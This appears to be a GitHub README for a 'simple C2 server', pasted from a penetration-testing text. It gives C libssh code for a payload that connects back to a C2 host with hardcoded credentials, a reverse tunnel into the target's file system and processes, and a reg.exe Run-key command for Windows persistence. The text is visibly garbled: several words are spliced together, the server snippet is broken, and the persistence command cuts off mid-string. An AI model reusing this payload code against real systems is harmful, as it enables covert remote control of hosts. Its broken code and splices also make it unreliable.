# A-simple-C2-server-
A  Penetration testing requirement


## C2 Server


SSH serving running on TCP port 443
Chroot jail to contain the SSH server
ModifPayload
Implementation of SSH server on non-standard TCP port
Implementation of SSH client permitting connections back to C2 server
Implementation of SSH tunnels (both local and dynamic) over the SSH
client permitting C2 access to target file system and processes
To implement the requirements for the payload, I strongly advocate using the
libssh library (https://www.libssh.org/) for the C programming language.
This will allow you to create very tight code and gives superb flexibility. This
library will also dramatically reduce your software development time. As
libssh is supported on a number of platforms, you will be able to create
payloads for Windows, OSX, Linux, or Unix with a minimum of code
modification. To give an example of how quick and easy libssh is to use, the
following code will implement an SSH server running on TCP port 900. The
code is sufficient to establish an authenticated SSH client session (using aied SSH configuration to permit remotely forwarded tunnels
username and password rather than a public key):



```
#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
int main()
{
ssh_session my_ssh_session;
int rc;
char *password;
my_ssh_session = ssh_new();
if (my_ssh_session == NULL)
exit(-1);
ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, "c2host");
ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, 443);
ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, "c2user");
rc = ssh_connect(my_ssh_session);
if (verify_knownhost(my_ssh_session) < 0)
{
ssh_disconnect(my_ssh_session);
ssh_free(my_ssh_session);
exit(-1);
}
password = ("Password");
rc = ssh_userauth_password(my_ssh_session, NULL, password);
ssh_disconnect(my_ssh_session);
ssh_free(my_ssh_session);
}

```


While this code creates an extremely simple SSH server instance:

```
#include "config.h"
#include <libssh/libssh.h>
#include <libssh/server.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <windows.h>
static int auth_password(char *user, char *password){
if(strcmp(user,"c2payload"))
return 0;
if(strcmp(password,"c2payload"))
return 0;
return 1; }
ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT_STR, 900)
return 0
} int main(){
sshbind=ssh_bind_new();
session=ssh_new();
ssh_disconnect(session);
ssh_bind_free(sshbind);
ssh_finalize();
return 0;
}
```


Finally, a reverse tunnel can be created as follows:

```
rc = ssh_channel_listen_forward(session, NULL, 1080, NULL);
channel = ssh_channel_accept_forward(session, 200, &port);
```

There are exception handling routines built into the libssh library to monitor
the health of the connectivity.
The only functionality described here that's not already covered is persistence.
There are many different ways to make your payload go persistent in
Microsoft Windows and we'll cover that in the next chapter. For now we'll go
the simple illustrative route. I don't recommend this approach in real-world
engagements, as it's pretty much zero stealth. Executed from C:


```
char command[100];
strcpy( command, " reg.exe add
"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
/v "Innoce
" );
system(command);
```
